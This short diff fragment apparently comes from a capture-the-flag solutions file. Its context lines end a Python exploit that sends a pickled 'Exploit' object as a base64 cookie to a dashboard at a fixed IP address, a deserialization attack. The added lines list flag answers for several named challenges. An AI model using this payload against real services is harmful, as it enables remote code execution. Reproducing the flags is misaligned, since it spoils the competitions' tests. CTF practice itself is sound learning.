@@ -205,3 +205,27 @@ headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
 t = requests.get("http://34.107.71.117:32664/dashboard",headers=headers)
 print(t.text)
 sendPayload(pickle.dumps(Exploit(), protocol=2))
+
+
+
+
+
+
+
+php - CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
+
+bolt - CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}
+
+shark - CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}
+
+sweet-and-sour - CTF{ccc1ccef217ed19c492bdada049ad2b0fbf1adcb72a92f13ab153aae068f797f}
+
+nodiff - CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}
+
+schematics - CTF{1nformat1on_sch3ma_c4n_d4t4}
+
+elastik - CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}
+
+Authorization - CTF{5b7cc033a48df4958a076286420b4a91631defa16be26409afbdf1e053367b21}
+
+online encryption - ECSC{dd545fbf12fd608daa8c201f50f95c8520bec9f744a3573b1dc0bc53ce019726}
